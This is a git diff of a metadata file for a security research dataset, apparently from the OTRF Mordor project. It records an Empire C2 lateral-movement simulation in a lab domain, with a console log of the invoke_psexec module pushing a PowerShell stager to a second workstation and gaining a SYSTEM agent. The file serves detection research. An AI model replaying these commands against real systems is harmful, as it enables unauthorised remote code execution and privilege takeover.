@@ -2,21 +2,26 @@ title: Empire Invoke PsExec
 id: SDWIN-190518210652
 author: Roberto Rodriguez @Cyb3rWard0g
 creation_date: 2019/05/18
-modification_date: 2020/08/07
+modification_date: 2020/09/20
 platform: Windows
-description: This dataset represents adversaries executing malicious code remotely psexec style
-dataset:
-  - type: Host
-    link:
-      - https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/empire_invoke_psexec.zip
+tags:
+  - RPC CreateService
+  - RPC StartService
+  - TCP Svcctl
+description: This dataset represents adversaries remotely creating and starting a service via RPC methods over TCP.
 attack_mappings:
   - technique: T1021
-    sub-technique: "002"
+    sub-technique:
     tactics:
       - TA0002
       - TA0008
 notebooks:
-simulator:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/empire_psexec_dcerpc_tcp_svcctl.zip
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/empire_psexec_dcerpc_tcp_svcctl.zip
+simulation:
   environment: Mordor shire
   tools:
     - type: C2
@@ -26,7 +31,22 @@ simulator:
   permissions_required:
     - User
   adversary_view: |-
-    (Empire: F82SZKVW) > usemodule lateral_movement/invoke_psexec
+    (Empire: stager/multi/launcher) > agents
+
+    [*] Active agents:
+
+    Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+    ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+    A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            
+    HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            
+    UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         6404   5/0.0    2020-09-20 16:13:06  http            
+
+
+    (Empire: agents) > interact UF5MYK42
+    (Empire: UF5MYK42) > usemodule lateral_movement/invoke_psexec
+    (Empire: powershell/lateral_movement/invoke_psexec) > set Listener http
+    (Empire: powershell/lateral_movement/invoke_psexec) > execute
+    (Empire: powershell/lateral_movement/invoke_psexec) > set ComputerName WORKSTATION6.theshire.local
     (Empire: powershell/lateral_movement/invoke_psexec) > info
 
                   Name: Invoke-PsExec
@@ -53,8 +73,8 @@ simulator:
 
       Name             Required    Value                     Description
       ----             --------    -------                   -----------
-      Agent            True        F82SZKVW                  Agent to run module on.                 
-      Listener         False       http                      Listener to use.                        
+      Agent            True        UF5MYK42                  Agent to run module on.                 
+      Listener         False                                 Listener to use.                        
       Obfuscate        False       False                     Switch. Obfuscate the launcher          
                                                             powershell code, uses the               
                                                             ObfuscateCommand for obfuscation types. 
@@ -66,8 +86,7 @@ simulator:
                                                             the stager code.                        
       AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   
                                                             the stager code.                        
-      ComputerName     True        WORKSTATION6.theshire.lo  Host[s] to execute the stager on, comma 
-                                  cal                       separated.                              
+      ComputerName     True        ComputerName WORKSTATION6.theshire.local Host to execute the stager on.          
       ServiceName      True        Updater                   The name of the service to create.      
       Command          False                                 Custom command to execute on remote     
                                                             hosts.                                  
@@ -83,16 +102,17 @@ simulator:
 
     (Empire: powershell/lateral_movement/invoke_psexec) > execute
     [>] Module is not opsec safe, run? [y/N] y
-    [*] Tasked F82SZKVW to run TASK_CMD_JOB
-    [*] Agent F82SZKVW tasked with task ID 3
-    [*] Tasked agent F82SZKVW to run module powershell/lateral_movement/invoke_psexec
+    [*] Tasked UF5MYK42 to run TASK_CMD_JOB
+    [*] Agent UF5MYK42 tasked with task ID 1
+    [*] Tasked agent UF5MYK42 to run module powershell/lateral_movement/invoke_psexec
     (Empire: powershell/lateral_movement/invoke_psexec) > 
-    Job started: KB5D9Y
+    Job started: RNU5DY
 
     [*] Sending POWERSHELL stager (stage 1) to 172.18.39.6
-    [*] New agent KL51GERT checked in
-    [+] Initial agent KL51GERT from 172.18.39.6 now active (Slack)
-    [*] Sending agent (stage 2) to KL51GERT at 172.18.39.6
+
+    [*] New agent 9CMNYX72 checked in
+    [+] Initial agent 9CMNYX72 from 172.18.39.6 now active (Slack)
+    [*] Sending agent (stage 2) to 9CMNYX72 at 172.18.39.6
 
     (Empire: powershell/lateral_movement/invoke_psexec) > agents
 
@@ -100,11 +120,20 @@ simulator:
 
     Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
     ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
-    62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            
-    F82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         6008   5/0.0    2020-08-07 19:12:34  http            
-    Y9RCLV64 ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       notepad            2576   5/0.0    2020-08-07 19:03:46  http            
+    A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            
+    HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            
+    UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         6404   5/0.0    2020-09-20 16:17:06  http            
 
-    KL51GERT ps 172.18.39.6     WORKSTATION6      *THESHIRE\SYSTEM        powershell         7516   5/0.0    2020-08-07 19:12:32  http            
+    9CMNYX72 ps 172.18.39.6     WORKSTATION6      *THESHIRE\SYSTEM        powershell         4312   5/0.0    2020-09-20 16:17:08  http            
 
-    (Empire: agents) >
+    (Empire: agents) > interact 9CMNYX72
+    (Empire: 9CMNYX72) > shell whoami
+    [*] Tasked 9CMNYX72 to run TASK_SHELL
+    [*] Agent 9CMNYX72 tasked with task ID 1
+    (Empire: 9CMNYX72) > 
+    nt authority\system
+
+    ..Command execution completed.
+
+    (Empire: 9CMNYX72) > back
 references:
